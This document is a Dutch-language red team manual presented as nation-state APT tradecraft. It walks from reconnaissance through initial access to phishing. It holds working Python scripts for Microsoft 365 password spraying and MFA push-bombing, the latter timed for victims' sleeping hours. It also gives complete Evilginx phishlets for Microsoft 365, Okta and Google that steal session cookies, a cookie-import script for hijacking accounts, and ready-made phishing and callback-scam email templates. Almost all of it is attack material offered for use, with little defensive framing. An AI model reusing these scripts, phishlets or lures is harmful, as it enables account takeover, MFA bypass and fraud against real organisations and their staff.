# XPOSE SECURITY — ULTIMATE RED TEAM OPERATIONS MANUAL

## Complete Praktische Command Reference met Uitleg
### Gebaseerd op Nation-State APT Technieken

**Classificatie:** STRIKT VERTROUWELIJK  
**Versie:** 3.0 | Januari 2026  
**Doel:** Nation-State Level Red Team Operations

---

# FASE 1: OSINT & PASSIVE RECONNAISSANCE

## 1.1 Subdomain Enumeration

```bash
subfinder -d target.com -all -o subdomains.txt
```

> **📘 UITLEG:**
> `subfinder` is een passieve subdomain discovery tool die 40+ bronnen queryt zonder direct contact met het target. 
> - `-d target.com` = target domain
> - `-all` = gebruik alle beschikbare bronnen (CT logs, DNS datasets, web archives, VirusTotal, etc.)
> - `-o subdomains.txt` = output naar bestand
> 
> **Waarom passief?** Geen DNS queries naar target = ondetecteerbaar. Perfect voor initiële reconnaissance.

---

```bash
amass enum -passive -d target.com -o amass_results.txt
```

> **📘 UITLEG:**
> `amass` is de meest uitgebreide OSINT tool, ontwikkeld door OWASP. Combineert 50+ databronnen.
> - `enum` = enumeration mode
> - `-passive` = alleen passieve bronnen, geen actieve DNS queries
> - `-d target.com` = target domain
> - `-o amass_results.txt` = output bestand
>
> **Bronnen:** Certificate Transparency, DNS aggregators, web archives, Shodan, Censys, VirusTotal, etc.

---

```bash
cat subdomains.txt amass_results.txt | sort -u | httpx -silent -o live_subdomains.txt
```

> **📘 UITLEG:**
> Combineert resultaten van meerdere tools en valideert welke subdomains daadwerkelijk live zijn.
> - `cat ... | sort -u` = combineer bestanden en verwijder duplicaten
> - `httpx -silent` = HTTP probe tool, test of hosts reageren
> - `-o live_subdomains.txt` = alleen live hosts naar output
>
> **Resultaat:** Gefilterde lijst van subdomains die daadwerkelijk bereikbaar zijn.

---

## 1.2 Certificate Transparency

```bash
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u > ct_domains.txt
```

> **📘 UITLEG:**
> Certificate Transparency (CT) logs bevatten ALLE uitgegeven SSL certificaten. Publiek doorzoekbaar.
> - `crt.sh` = gratis CT log zoekmachine
> - `q=%.target.com` = wildcard search (vindt ook *.internal.target.com)
> - `output=json` = machine-readable output
> - `jq -r '.[].name_value'` = extract alleen domain names uit JSON
>
> **Gouden tip:** CT logs bevatten vaak interne subdomeinen die niet publiek resolved maar wel een cert hebben.

---

## 1.3 Email & Employee Discovery

```bash
theHarvester -d target.com -b google,bing,linkedin,hunter,dnsdumpster -f harvest_results
```

> **📘 UITLEG:**
> `theHarvester` verzamelt emails, namen, subdomeinen en IPs uit publieke bronnen.
> - `-d target.com` = target domain
> - `-b google,bing,linkedin,hunter,dnsdumpster` = specifieke bronnen
> - `-f harvest_results` = output naar bestand
>
> **Output bevat:**
> - Email adressen (voor phishing targets)
> - Email patterns (j.smith@ vs john.smith@)
> - Employee namen (voor social engineering)
> - Subdomeinen en IPs

---

```bash
python3 crosslinked.py -f '{first}.{last}@target.com' "Target Company" -o employees.txt
```

> **📘 UITLEG:**
> `CrossLinked` scraped LinkedIn employee data ZONDER in te loggen (via Google/Bing dorks).
> - `-f '{first}.{last}@target.com'` = email format template
> - `"Target Company"` = bedrijfsnaam zoals op LinkedIn
> - `-o employees.txt` = output bestand
>
> **Veiligheid:** Geen LinkedIn login nodig = geen account risico. Gebruikt search engine cache.
>
> **Output:** Lijst van gegenereerde email adressen gebaseerd op gevonden employee namen.

---

## 1.4 Credential Leak Discovery

```bash
curl -s "https://api.dehashed.com/search?query=domain:target.com" \
    -u "email@example.com:api_key" | jq '.entries[] | {email, password, hashed_password}'
```

> **📘 UITLEG:**
> `Dehashed` is een breach database met miljarden gelekte credentials.
> - `query=domain:target.com` = zoek alle entries voor dit domain
> - `-u "email:api_key"` = authenticatie (betaalde service)
> - `jq` filter = extract alleen relevante velden
>
> **Output bevat:**
> - Email adressen
> - Cleartext wachtwoorden (indien beschikbaar)
> - Gehashte wachtwoorden (kunnen worden gekraakt)
>
> **Gebruik:** Credential stuffing, password pattern analyse, target prioritering.

---

## 1.5 Technology Fingerprinting

```bash
shodan host 203.0.113.50
```

> **📘 UITLEG:**
> `Shodan` is een zoekmachine voor internet-connected devices. Scant continu het hele internet.
> - `host 203.0.113.50` = lookup specifiek IP adres
>
> **Output bevat:**
> - Open poorten en services
> - Software versies en banners
> - SSL certificaat info
> - Bekende vulnerabilities (CVE matching)
> - Geolocation en ISP info
>
> **Waarom nuttig:** Geen actieve scanning nodig - Shodan heeft het al gedaan.

---

```bash
shodan search "ssl.cert.subject.cn:target.com" --fields ip_str,port,product,version
```

> **📘 UITLEG:**
> Zoek alle Shodan entries met SSL certificaten voor target.com.
> - `ssl.cert.subject.cn:target.com` = certificaat Common Name filter
> - `--fields ip_str,port,product,version` = specifieke output velden
>
> **Vindt:** Servers achter CDN, cloud instances, development servers, etc.

---

# FASE 2: ACTIVE RECONNAISSANCE

## 2.1 Port Scanning

```bash
nmap -sT -T4 --top-ports 1000 -oA quick_scan 192.168.1.0/24
```

> **📘 UITLEG:**
> `nmap` is de standaard port scanner. Dit is een snelle initial scan.
> - `-sT` = TCP connect scan (volledige TCP handshake, betrouwbaar maar logged)
> - `-T4` = aggressive timing (sneller, meer kans op detectie)
> - `--top-ports 1000` = scan alleen de 1000 meest gebruikte poorten
> - `-oA quick_scan` = output in alle formaten (.nmap, .xml, .gnmap)
>
> **Wanneer gebruiken:** Initiële reconnaissance, netwerk mapping.

---

```bash
nmap -sS -T2 -p- --min-rate 1000 -oA full_scan 192.168.1.50
```

> **📘 UITLEG:**
> Volledige port scan met stealth opties.
> - `-sS` = SYN scan (half-open, minder logging dan -sT)
> - `-T2` = langzamere timing (minder detectie)
> - `-p-` = ALLE 65535 poorten
> - `--min-rate 1000` = minimaal 1000 packets/sec (balans snelheid/stealth)
>
> **Waarom alle poorten?** Services draaien vaak op non-standard poorten (backdoors, admin panels).

---

```bash
nmap -sV -sC -p 22,80,443,445,3389,5985 -oA service_scan 192.168.1.50
```

> **📘 UITLEG:**
> Service version detection en script scanning.
> - `-sV` = version detection (banner grabbing, probes)
> - `-sC` = default NSE scripts (safe reconnaissance scripts)
> - `-p 22,80,443,445,3389,5985` = specifieke interessante poorten
>
> **Poorten uitleg:**
> - 22 = SSH
> - 80/443 = HTTP/HTTPS
> - 445 = SMB
> - 3389 = RDP
> - 5985 = WinRM

---

```bash
masscan -p1-65535 --rate 10000 192.168.1.0/24 -oJ masscan_results.json
```

> **📘 UITLEG:**
> `masscan` is de snelste port scanner - kan het hele internet scannen in <6 minuten.
> - `-p1-65535` = alle poorten
> - `--rate 10000` = 10.000 packets per seconde
> - `-oJ` = JSON output
>
> **Strategie:** Gebruik masscan voor snelle discovery, nmap voor details.
> ```bash
> # Combinatie workflow:
> masscan -p1-65535 --rate 10000 target -oL ports.txt
> nmap -sV -p $(cat ports.txt | grep open | cut -d' ' -f3 | tr '\n' ',') target
> ```

---

## 2.2 SMB Enumeration

```bash
crackmapexec smb 192.168.1.0/24 -u '' -p '' --shares
```

> **📘 UITLEG:**
> `CrackMapExec` (CME) is de Swiss Army knife voor Windows/AD pentesting.
> - `smb` = SMB protocol
> - `-u '' -p ''` = anonymous/null session
> - `--shares` = enumerate beschikbare shares
>
> **Null session:** Veel Windows systemen staan anonymous SMB enumeration toe.
>
> **Output:** Lijst van shares met permissies (READ, WRITE).

---

```bash
crackmapexec smb 192.168.1.50 -u '' -p '' --users --pass-pol
```

> **📘 UITLEG:**
> Enumerate users en password policy via SMB.
> - `--users` = lijst van domain users
> - `--pass-pol` = password policy (lockout threshold, complexity, etc.)
>
> **Waarom password policy?** Bepaalt hoe agressief je kunt password sprayen:
> - Lockout threshold 5 = max 4 pogingen per user
> - Lockout duration 30 min = wacht 30 min tussen spray rounds

---

```bash
smbmap -H 192.168.1.50 -u 'guest' -p '' -R
```

> **📘 UITLEG:**
> `smbmap` enumereert SMB shares met permissie details.
> - `-H 192.168.1.50` = target host
> - `-u 'guest' -p ''` = guest account (vaak enabled)
> - `-R` = recursive listing van share contents
>
> **Zoek naar:** Backup files, scripts met credentials, config files, database dumps.

---

## 2.3 Responder - LLMNR/NBT-NS Poisoning (APT28 Techniek)

```bash
sudo responder -I eth0 -wrf
```

> **📘 UITLEG:**
> `Responder` vangt credentials door te antwoorden op broadcast name resolution requests.
> - `-I eth0` = network interface
> - `-w` = start WPAD rogue proxy
> - `-r` = antwoord op NetBIOS requests
> - `-f` = force WPAD authentication
>
> **Hoe werkt het:**
> 1. User typt verkeerde hostname (\\fileservrr)
> 2. DNS lookup faalt
> 3. Windows broadcast LLMNR/NBT-NS "wie is fileservrr?"
> 4. Responder antwoordt "dat ben ik!"
> 5. Windows stuurt credentials (NetNTLMv2 hash)
>
> **APT28 gebruikt dit voor initiële credential harvesting in interne netwerken.**

---

```bash
cat /usr/share/responder/logs/HTTP-NTLMv2-*.txt
```

> **📘 UITLEG:**
> Bekijk captured NetNTLMv2 hashes.
>
> **Hash formaat:**
> ```
> user::DOMAIN:challenge:response:blob
> ```
>
> **Volgende stap:** Crack met hashcat of relay met ntlmrelayx.

---

```bash
hashcat -m 5600 captured_hashes.txt rockyou.txt -r best64.rule
```

> **📘 UITLEG:**
> Crack NetNTLMv2 hashes met hashcat.
> - `-m 5600` = hash mode voor NetNTLMv2
> - `rockyou.txt` = wordlist
> - `-r best64.rule` = rule file voor password mutations
>
> **Rules transformeren:** password → Password, Password1, P@ssword, password123, etc.

---

# FASE 3: INITIAL ACCESS

## 3.1 Password Spraying

```bash
sprayhound -U users.txt -p 'Summer2024!' -d target.com -dc 192.168.1.10
```

> **📘 UITLEG:**
> `sprayhound` is een smart password spraying tool met lockout awareness.
> - `-U users.txt` = lijst van usernames
> - `-p 'Summer2024!'` = single password to spray
> - `-d target.com` = domain
> - `-dc 192.168.1.10` = domain controller IP
>
> **Lockout-safe:** Sprayhound tracked attempts en respecteert password policy.
>
> **Common passwords om te proberen:**
> - Season + Year: Summer2024!, Winter2024!, Spring2024!
> - Company + Year: Target2024!, TargetCorp2024!
> - Defaults: Welcome1!, Password1!, Welkom01!

---

```python
#!/usr/bin/env python3
"""
o365_spray.py - Microsoft 365 Password Spraying
"""

import requests
import time
import random

def spray_o365(email: str, password: str) -> dict:
    """
    Test single credential against O365.
    Returns: {"valid": bool, "mfa": bool, "locked": bool, "error": str}
    """
    url = "https://login.microsoftonline.com/common/oauth2/token"
    
    data = {
        "grant_type": "password",
        "username": email,
        "password": password,
        "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
        "resource": "https://graph.microsoft.com"
    }
    
    try:
        r = requests.post(url, data=data, timeout=10)
        
        if r.status_code == 200:
            return {"valid": True, "mfa": False, "locked": False, "error": None}
        
        error_code = r.json().get("error_description", "")
        
        if "AADSTS50076" in error_code:
            return {"valid": True, "mfa": True, "locked": False, "error": "MFA required"}
        
        if "AADSTS50053" in error_code:
            return {"valid": False, "mfa": False, "locked": True, "error": "Account locked"}
        
        if "AADSTS50126" in error_code:
            return {"valid": False, "mfa": False, "locked": False, "error": "Invalid password"}
            
    except Exception as e:
        return {"valid": False, "mfa": False, "locked": False, "error": str(e)}
    
    return {"valid": False, "mfa": False, "locked": False, "error": "Unknown"}


def spray_campaign(users: list, password: str, delay: float = 1.0):
    """Spray single password across all users."""
    results = {"valid": [], "mfa": [], "locked": []}
    
    for user in users:
        result = spray_o365(user, password)
        
        if result["valid"] and not result["mfa"]:
            print(f"[+] VALID (no MFA): {user}:{password}")
            results["valid"].append(user)
        elif result["valid"] and result["mfa"]:
            print(f"[+] VALID (MFA): {user}:{password}")
            results["mfa"].append(user)
        elif result["locked"]:
            print(f"[!] LOCKED: {user}")
            results["locked"].append(user)
        
        # Jitter to avoid detection
        time.sleep(delay + random.uniform(0, 0.5))
    
    return results
```

> **📘 UITLEG:**
> Dit script spray password tegen Microsoft 365 accounts.
>
> **Belangrijke response codes:**
> - `AADSTS50076` = Valid credentials maar MFA vereist → Credential is goed!
> - `AADSTS50053` = Account locked → Stop met deze user
> - `AADSTS50126` = Invalid password → Probeer volgende password
>
> **Timing:** 
> - Wacht minimaal 1 seconde tussen requests
> - Wacht 30-60 minuten tussen password rounds
> - Spray tijdens werkuren (minder verdacht)

---

## 3.2 MFA Fatigue Attack (Scattered Spider Techniek)

```python
#!/usr/bin/env python3
"""
mfa_fatigue.py - MFA Push Bombing Attack
Techniek: Scattered Spider / Lapsus$
"""

import requests
import time
import random
from datetime import datetime

class MFAFatigue:
    def __init__(self, email: str, password: str):
        self.email = email
        self.password = password
        self.url = "https://login.microsoftonline.com/common/oauth2/token"
        
    def send_push(self) -> bool:
        """Trigger MFA push notification."""
        data = {
            "grant_type": "password",
            "username": self.email,
            "password": self.password,
            "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
            "resource": "https://graph.microsoft.com"
        }
        
        r = requests.post(self.url, data=data, timeout=30)
        
        if r.status_code == 200:
            print(f"[+] SUCCESS! MFA approved at {datetime.now()}")
            return True
        
        if "AADSTS50076" in r.text:
            print(f"[*] Push sent at {datetime.now()}")
        
        return False
    
    def attack(self, max_pushes: int = 50, interval_seconds: int = 60):
        """
        Execute MFA fatigue attack.
        
        Best timing:
        - 02:00-04:00 AM: User is sleepy, approves to stop notifications
        - 07:00-08:00 AM: Morning rush, quick approval
        - 17:00-18:00 PM: End of day, wants to go home
        """
        print(f"[*] Starting MFA fatigue on {self.email}")
        print(f"[*] Max pushes: {max_pushes}, Interval: {interval_seconds}s")
        
        for i in range(max_pushes):
            print(f"\n[*] Push {i+1}/{max_pushes}")
            
            if self.send_push():
                print("[+] TARGET APPROVED MFA!")
                return True
            
            # Add jitter
            sleep_time = interval_seconds + random.randint(-10, 30)
            print(f"[*] Waiting {sleep_time}s...")
            time.sleep(sleep_time)
        
        print("[!] Attack finished - no approval")
        return False


if __name__ == "__main__":
    # Vereist: geldige credentials (van spray of breach)
    attacker = MFAFatigue(
        email="victim@target.com",
        password="Summer2024!"  # Known valid password
    )
    attacker.attack(max_pushes=30, interval_seconds=120)
```

> **📘 UITLEG:**
> MFA Fatigue (Push Bombing) is een Scattered Spider signature techniek.
>
> **Hoe werkt het:**
> 1. Attacker heeft valid credentials (van spray/breach)
> 2. Login attempt triggert MFA push naar victim's telefoon
> 3. Herhaaldelijk pushen tot victim approve klikt (uit frustratie/vermoeidheid)
>
> **Succes factoren:**
> - 's Nachts (02:00-04:00): Slaperige user klikt approve
> - Combineer met vishing: "IT Security hier, we zien verdachte pushes..."
> - 1-2 minuten tussen pushes om niet geblokkeerd te worden
>
> **Defense:** Number matching MFA (user moet code invoeren, niet alleen approve).

---


---

# FASE 4: PHISHING & SOCIAL ENGINEERING

## 4.1 Evilginx2 Setup & Configuratie

```bash
# Download en compileer Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
sudo ./bin/evilginx -p ./phishlets
```

> **📘 UITLEG:**
> `Evilginx2` is een man-in-the-middle phishing framework dat sessie cookies captured.
>
> **Waarom Evilginx ipv GoPhish?**
> - GoPhish captured alleen credentials
> - Evilginx captured credentials + session cookies
> - Session cookies bypassen MFA volledig!
>
> **Vereisten:**
> - VPS met publiek IP
> - Domain voor phishing
> - SSL certificaat (automatisch via Let's Encrypt)

---

```bash
# Evilginx console configuratie
: config domain evil-domain.com
: config ip 203.0.113.50
```

> **📘 UITLEG:**
> Basis configuratie van Evilginx.
> - `config domain` = je phishing domain (koop lookalike: target-login.com)
> - `config ip` = publiek IP van je server
>
> **DNS setup vereist:**
> ```
> A     @              203.0.113.50
> A     *              203.0.113.50
> NS    ns1            203.0.113.50
> NS    ns2            203.0.113.50
> ```

---

## 4.2 Evilginx Phishlets (Complete YAML)

### Microsoft 365 Phishlet

```yaml
# Bestand: /phishlets/o365.yaml
# Microsoft 365 Complete Phishlet

name: 'Microsoft 365'
author: 'XPOSE Security'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, auto_filter: true}
  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'office.com', session: true, auto_filter: true}
  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false}
  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msauth.net', session: false}

sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: 'login.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'www', domain: 'office.com', search: 'www.office.com', replace: 'www.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'portal', domain: 'office.com', search: 'portal.office.com', replace: 'portal.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT']
  - domain: 'login.microsoftonline.com'
    keys: ['SignInStateCookie', 'ESTSSC', 'buid', 'esctx']
  - domain: '.office.com'
    keys: ['OIDCAuthCookie', 'AjaxSessionKey']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/common/oauth2/v2.0/authorize'
```

> **📘 UITLEG:**
> Dit phishlet proxied de complete Microsoft 365 login flow.
>
> **Sectie breakdown:**
> - `proxy_hosts`: Welke Microsoft domeinen we proxyen
>   - `is_landing: true` = dit is de entry point URL
>   - `session: true` = capture cookies van dit domein
> 
> - `sub_filters`: URL rewriting regels
>   - Vervangt originele Microsoft URLs met onze phishing URLs
>   - Victim ziet onze domain maar praat eigenlijk met Microsoft
>
> - `auth_tokens`: Welke cookies te capturen
>   - `ESTSAUTH` = Microsoft sessie cookie
>   - `ESTSAUTHPERSISTENT` = persistent login cookie
>   - Deze cookies bevatten de MFA approval!
>
> - `credentials`: Welke POST parameters credentials bevatten
>   - `login` = username/email veld
>   - `passwd` = password veld

---

### Okta Phishlet

```yaml
# Bestand: /phishlets/okta.yaml
# Okta SSO Phishlet - Scattered Spider primary target

name: 'Okta'
author: 'XPOSE Security'
min_ver: '3.0.0'

# BELANGRIJK: Vervang {okta_org} met target's Okta subdomain
# Voorbeeld: target.okta.com → okta_org = "target"

proxy_hosts:
  - {phish_sub: 'sso', orig_sub: '', domain: '{okta_org}.okta.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'static', orig_sub: 'ok1static', domain: 'oktacdn.com', session: false}
  - {phish_sub: 'assets', orig_sub: 'ok2static', domain: 'oktacdn.com', session: false}

sub_filters:
  - {triggers_on: '{okta_org}.okta.com', orig_sub: '', domain: '{okta_org}.okta.com', search: '{okta_org}.okta.com', replace: 'sso.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: '{okta_org}.okta.com', orig_sub: '', domain: '{okta_org}.okta.com', search: '{okta_org}.okta.com', replace: 'sso.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:
  - domain: '.{okta_org}.okta.com'
    keys: ['sid', 'DT', 'oktaStateToken', 'idx']
  - domain: '{okta_org}.okta.com'
    keys: ['JSESSIONID', 'proximity_token']

credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'credentials.passcode'
    search: '(.*)'
    type: 'post'

login:
  domain: '{okta_org}.okta.com'
  path: '/login/login.htm'
```

> **📘 UITLEG:**
> Okta phishlet voor Scattered Spider style attacks.
>
> **Configuratie stappen:**
> 1. Vind target's Okta org: `https://target.okta.com`
> 2. Vervang alle `{okta_org}` met `target`
> 3. Save als `okta_target.yaml`
>
> **Okta specifieke cookies:**
> - `sid` = Session ID - de hoofdprijs!
> - `DT` = Device Trust token
> - `oktaStateToken` = Auth flow state
>
> **Na capture:** Import `sid` cookie in browser → je bent de victim.

---

### Google Workspace Phishlet

```yaml
# Bestand: /phishlets/google.yaml
# Google Workspace Phishlet

name: 'Google Workspace'
author: 'XPOSE Security'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, auto_filter: true}
  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: false}
  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: false}
  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'googleusercontent.com', session: false}

sub_filters:
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'accounts.google.com', replace: 'accounts.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'myaccount.google.com', replace: 'myaccount.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}

auth_tokens:
  - domain: '.google.com'
    keys: ['SID', 'SSID', 'HSID', 'LSID', 'NID', 'APISID', 'SAPISID', 
           '__Secure-1PSID', '__Secure-3PSID', '__Secure-1PAPISID', '__Secure-3PAPISID']

credentials:
  username:
    key: 'identifier'
    search: '(.*)'
    type: 'post'
  password:
    key: 'Passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'accounts.google.com'
  path: '/v3/signin/'
```

> **📘 UITLEG:**
> Google Workspace phishlet met alle benodigde cookies.
>
> **Google's cookie system is complex:**
> - `SID`, `SSID`, `HSID`, `LSID` = Core session cookies
> - `__Secure-*` cookies = Nieuwe secure cookies (Chrome)
> - JE HEBT ZE ALLEMAAL NODIG voor een werkende sessie
>
> **Let op:** Google update hun login flow regelmatig. Test voor deployment!

---

## 4.3 Evilginx Operaties

```bash
# Phishlet activeren
: phishlets hostname o365 login.evil-domain.com
: phishlets enable o365
```

> **📘 UITLEG:**
> Activeer en configureer phishlet.
> - `hostname o365 login.evil-domain.com` = subdomain voor deze phishlet
> - `enable o365` = start de proxy
>
> **Resultaat:** `https://login.evil-domain.com` ziet er exact uit als Microsoft login.

---

```bash
# Lure (phishing URL) aanmaken
: lures create o365
: lures edit 0 redirect_url https://office.com
: lures get-url 0
```

> **📘 UITLEG:**
> Maak phishing URL aan.
> - `lures create o365` = nieuwe lure voor o365 phishlet
> - `edit 0 redirect_url` = waar victim naartoe gaat na login
> - `get-url 0` = toon de phishing URL
>
> **Output:** `https://login.evil-domain.com/NeKzaHtQ`
> Dit is de URL die je naar targets stuurt!

---

```bash
# Monitor sessions (real-time)
: sessions

# Bekijk specifieke sessie
: sessions 1

# Export cookies voor gebruik
: sessions 1 export
```

> **📘 UITLEG:**
> Monitor en export captured sessies.
>
> **`sessions` output:**
> ```
> id | phishlet | username           | password    | tokens | created
> 1  | o365     | j.smith@target.com | Summer2024! | 8      | 2024-01-15 10:23
> ```
>
> **`sessions 1` toont:**
> - Captured username en password
> - Alle captured cookies (auth tokens)
> - User agent en IP info
>
> **`sessions 1 export` output:** JSON bestand met alle cookies voor import.

---

## 4.4 Cookie Import voor Session Hijacking

```javascript
// Browser Console - Cookie Import Script
// Open target site (office.com), open DevTools (F12), paste in Console

// Cookies van Evilginx export
const cookies = [
    {name: "ESTSAUTH", value: "captured_value_here", domain: ".login.microsoftonline.com"},
    {name: "ESTSAUTHPERSISTENT", value: "captured_value_here", domain: ".login.microsoftonline.com"},
    // ... meer cookies
];

// Set cookies
cookies.forEach(c => {
    document.cookie = `${c.name}=${c.value}; domain=${c.domain}; path=/; secure`;
});

console.log("[+] Cookies imported - refresh page");
```

> **📘 UITLEG:**
> Import captured cookies in je browser voor session hijacking.
>
> **Alternatief - EditThisCookie extension:**
> 1. Install EditThisCookie Chrome extension
> 2. Ga naar target site (office.com)
> 3. Klik EditThisCookie → Import
> 4. Paste JSON van Evilginx export
> 5. Refresh pagina → je bent ingelogd als victim
>
> **Waarom werkt dit?**
> - Session cookies bevatten de MFA approval
> - Server ziet geldige cookies = geldige sessie
> - Geen nieuwe MFA prompt!

---

## 4.5 Phishing Email Templates

### IT Password Expiration

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Password Expiration Notice</title>
</head>
<body style="font-family: 'Segoe UI', Arial, sans-serif; max-width: 600px; margin: 0 auto; background: #f5f5f5; padding: 20px;">
    
    <div style="background: #0078d4; padding: 20px; text-align: center;">
        <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" 
             alt="Microsoft" style="height: 30px;">
    </div>
    
    <div style="background: white; padding: 30px; border: 1px solid #e0e0e0;">
        <h2 style="color: #333; margin-top: 0;">Password Expiration Notice</h2>
        
        <p>Dear {{.FirstName}},</p>
        
        <p>Your network password will expire in <strong style="color: #d32f2f;">24 hours</strong>. 
        To maintain access to your account and avoid disruption, please update your password immediately.</p>
        
        <div style="background: #fff3cd; border-left: 4px solid #ffc107; padding: 15px; margin: 20px 0;">
            <strong>⚠️ Action Required</strong><br>
            Failure to update your password will result in account lockout.
        </div>
        
        <div style="text-align: center; margin: 30px 0;">
            <a href="{{.URL}}" style="background: #0078d4; color: white; padding: 14px 35px; 
               text-decoration: none; border-radius: 4px; font-weight: 600; display: inline-block;">
                Update Password Now
            </a>
        </div>
        
        <p style="font-size: 13px; color: #666;">
            If you did not request this change or have questions, contact the IT Help Desk 
            at <a href="mailto:helpdesk@target.com">helpdesk@target.com</a> or call ext. 4357.
        </p>
        
        <p style="margin-bottom: 0;">
            Best regards,<br>
            <strong>IT Security Team</strong><br>
            Target Corporation
        </p>
    </div>
    
    <div style="text-align: center; padding: 15px; font-size: 11px; color: #888;">
        This is an automated security notification.<br>
        © 2024 Target Corporation. All rights reserved.
    </div>
    
</body>
</html>
```

> **📘 UITLEG:**
> IT Password expiration email - hoogste click rate van alle phishing types.
>
> **Psychologische triggers:**
> - **Urgentie:** "24 hours" - forces quick action without thinking
> - **Autoriteit:** "IT Security Team" - vertrouwde afzender
> - **Consequentie:** "account lockout" - angst voor verlies
> - **Legitimiteit:** Microsoft branding, professional layout
>
> **Variables (mail merge):**
> - `{{.FirstName}}` = victim's voornaam
> - `{{.URL}}` = Evilginx phishing URL
>
> **Timing:** Verstuur op maandag ochtend of vrijdag middag (haast).

---

### Callback Phishing (BazarCall/FIN7 Style)

```html
<!DOCTYPE html>
<html>
<body style="font-family: Georgia, serif; max-width: 650px; margin: 0 auto; padding: 20px;">
    
    <div style="text-align: center; border-bottom: 2px solid #333; padding-bottom: 20px;">
        <h1 style="margin: 0; font-size: 24px;">Payment Confirmation</h1>
        <p style="margin: 5px 0 0 0; color: #666;">Order #ORD-2024-{{.OrderID}}</p>
    </div>
    
    <div style="padding: 30px 0;">
        <p>Dear Valued Customer,</p>
        
        <p>Thank you for your purchase. Your payment has been successfully processed.</p>
        
        <table style="width: 100%; border-collapse: collapse; margin: 25px 0; font-family: Arial, sans-serif;">
            <tr style="background: #2d2d2d; color: white;">
                <th style="padding: 12px; text-align: left;">Description</th>
                <th style="padding: 12px; text-align: right;">Amount</th>
            </tr>
            <tr style="border-bottom: 1px solid #ddd;">
                <td style="padding: 12px;">{{.ProductName}} - Annual Subscription</td>
                <td style="padding: 12px; text-align: right;">${{.Amount}}.00</td>
            </tr>
            <tr style="border-bottom: 1px solid #ddd;">
                <td style="padding: 12px;">Processing Fee</td>
                <td style="padding: 12px; text-align: right;">$4.99</td>
            </tr>
            <tr style="background: #f5f5f5; font-weight: bold;">
                <td style="padding: 12px;">Total Charged</td>
                <td style="padding: 12px; text-align: right;">${{.Total}}.99</td>
            </tr>
        </table>
        
        <p><strong>Payment Method:</strong> Visa ending in {{.CardLast4}}<br>
        <strong>Transaction ID:</strong> TXN-{{.TransactionID}}<br>
        <strong>Date:</strong> {{.Date}}</p>
    </div>
    
    <div style="background: #fff3cd; border: 2px solid #ffc107; border-radius: 8px; padding: 25px; text-align: center; margin: 20px 0;">
        <p style="margin: 0 0 10px 0; font-size: 18px; font-weight: bold; color: #856404;">
            ⚠️ Didn't Authorize This Transaction?
        </p>
        <p style="margin: 0 0 20px 0; color: #856404;">
            If you did not make this purchase, please contact our billing department 
            immediately to cancel and receive a full refund:
        </p>
        <p style="margin: 0; font-size: 32px; font-weight: bold; color: #c62828; font-family: Arial;">
            📞 1-888-{{.PhoneNumber}}
        </p>
        <p style="margin: 10px 0 0 0; font-size: 12px; color: #666;">
            Available 24/7 • Call within 24 hours for guaranteed refund
        </p>
    </div>
    
    <div style="font-size: 12px; color: #888; border-top: 1px solid #ddd; padding-top: 20px;">
        <p>This is an automated receipt. Please do not reply to this email.</p>
        <p>{{.FakeCompany}} Inc.<br>
        1234 Commerce Street, Suite 500<br>
        Wilmington, DE 19801</p>
    </div>
    
</body>
</html>
```

> **📘 UITLEG:**
> Callback phishing (BazarCall) - FIN7/Conti signature technique.
>
> **Waarom callback phishing?**
> - **Geen links of attachments** = passeert email security
> - **Victim initieert contact** = hogere trust
> - **Telefonische social engineering** = zeer effectief
>
> **Call flow:**
> 1. Victim belt "support" nummer
> 2. Operator: "Om te cancellen moet ik uw computer verifiëren"
> 3. Operator: "Download AnyDesk/TeamViewer zodat ik kan helpen"
> 4. Remote access → malware installatie
>
> **Variabelen:**
> - Hoge bedragen ($299-499) voor urgentie
> - Bekende producten (Norton, McAfee, Geek Squad)
> - Professioneel ogende invoice

---


---

